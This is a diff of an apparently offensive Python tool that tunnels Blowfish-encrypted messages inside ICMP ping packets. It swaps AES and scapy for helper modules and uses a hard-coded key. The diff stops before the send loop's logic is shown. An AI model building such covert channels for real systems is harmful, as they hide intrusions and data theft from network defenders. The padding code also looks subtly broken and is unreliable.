@@ -3,36 +3,73 @@
 from __future__ import print_function
 
 from subprocess import Popen, PIPE
-from scapy.all import *
+# from scapy.all import *
 from time import sleep
-from Crypto.Cipher import AES
+# from Crypto.Cipher import AES
 from base64 import b64encode as enc, b64decode as dec
 
-conf.verb = 0
+from readping import get_one
+from sendping import send_one
+import blowfish
 
-pad = lambda x: enc(x) + '\0' * (16 - len(enc(x))%16)
-unpad = lambda x: dec(x.rstrip('\0'))
+# conf.verb = 0
 
-secret_key = pad('This is a secret key!')
-aesobj = AES.new(secret_key)
+pad = lambda x: enc(x) + '\0' * (64 - len(enc(x))%16)
+
+# secret_key = pad('This is a secret key!')
+# aesobj = AES.new(secret_key)
+
+secret_key = 'This is a secret key!'
+bfobj = blowfish.Blowfish(secret_key)
+
+def encrypt(mesg):
+    mesg = enc(mesg)
+    strs = []
+    while len(mesg) >= 8:
+        strs += [mesg[:8]]
+        mesg = mesg[8:]
+
+    strs += [mesg + '\0' * (8 - len(mesg))]
+    return ''.join([bfobj.encrypt(item) for item in strs])
+
+def decrypt(ciphertext):
+    strs = []
+    while len(ciphertext) >= 8:
+        strs += [ciphertext[:8]]
+        ciphertext = ciphertext[8:]
+
+    if ciphertext != '':
+        return None
+
+    padded = ''.join([bfobj.decrypt(item) for item in strs])
+
+    return dec(padded.rstrip('\0'))
 
 def send_covert(lead, message, dest):
-    outbound = aesobj.encrypt(pad(lead + message))
+    # outbound = aesobj.encrypt(pad(lead + message))
+    outbound = encrypt(lead + message)
     # outbound = lead + message
-    send(IP(dst=dest)/ICMP()/outbound)
+    # send(IP(dst=dest)/ICMP()/outbound)
+    send_one(outbound)
 
 def get_covert(lead):
-    mesg = sniff(filter='icmp', count=1)[0]
-    if Raw in mesg:
-        try:
-            mesg = unpad(aesobj.decrypt(mesg.load))
-        except ValueError:
-            return get_covert(lead)
-        # mesg = mesg.load
-        if mesg[:len(lead)] == lead:
-            return mesg[len(lead):]
-        else:
-            return get_covert(lead)
+    # mesg = sniff(filter='icmp', count=1)[0]
+    # if Raw in mesg:
+    #     try:
+    #         mesg = unpad(aesobj.decrypt(mesg.load))
+    #     except ValueError:
+    #         return get_covert(lead)
+    #     # mesg = mesg.load
+    #     if mesg[:len(lead)] == lead:
+    #         return mesg[len(lead):]
+    #     else:
+    #         return get_covert(lead)
+    mesg = get_one()
+    payload = decrypt(mesg.load)
+    if payload:
+        return payload[len(lead):]
+    else:
+        return get_covert(lead)
 
 def send_loop():
     while True:
